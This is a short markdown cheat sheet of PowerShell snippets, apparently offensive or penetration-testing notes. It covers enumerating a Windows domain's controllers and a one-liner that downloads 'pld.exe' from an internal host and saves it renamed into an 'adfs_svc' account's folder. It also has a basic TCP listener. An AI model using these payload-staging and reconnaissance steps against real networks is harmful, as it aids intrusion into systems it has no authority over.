# Powershell

### Get all domain controllers

```powershell
$domain = ((systeminfo | Select-String "Domain:").Line -split ":")[1].Trim()
nslookup -type=SRV "_ldap._tcp.dc._msdcs.$domain"
```

### Download file

```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData("http://192.168.20.31:4445/pld.exe");[System.IO.File]::WriteAllBytes("C:\Users\adfs_svc\Documents\pipa.exe",$bytes);
```

### Listener

```powershell
$Listener = [System.Net.Sockets.TcpListener]8080;
$Listener.Start();
while ($true) {
    $client = $listener.AcceptTcpClient()
    $remoteEndPoint = $client.Client.RemoteEndPoint 
    Write-Host "IP: $($remoteEndPoint.Address), Port: $($remoteEndPoint.Port)"
    $client.Close()
}
```



